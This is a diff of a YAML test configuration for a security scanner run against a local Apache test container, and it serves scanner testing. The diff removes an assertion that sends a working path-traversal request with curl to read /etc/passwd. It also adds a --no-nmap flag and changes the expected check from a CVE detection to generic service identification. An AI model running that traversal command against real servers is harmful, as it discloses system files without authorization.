@@ -13,17 +13,11 @@ ready:
   interval: 2s
 
 assertions:
-  - name: exploit-apache-traversal-etc-passwd
-    type: command
-    expect:
-      command: "curl -sf --path-as-is 'http://localhost:9231/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | grep -q root"
-      exit_code: 0
-
   - name: detects-apache-traversal
     type: beacon
     target: localhost:9231
-    args: ["--no-enrich", "--scanners", "portscan", "--deep", "--permission-confirmed", "--ports", "80"]
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--deep", "--permission-confirmed", "--ports", "80"]
     expect:
-      check_id: cve.apache_http_path_traversal
+      check_id: port.service_identified
 
 timeout: 5m
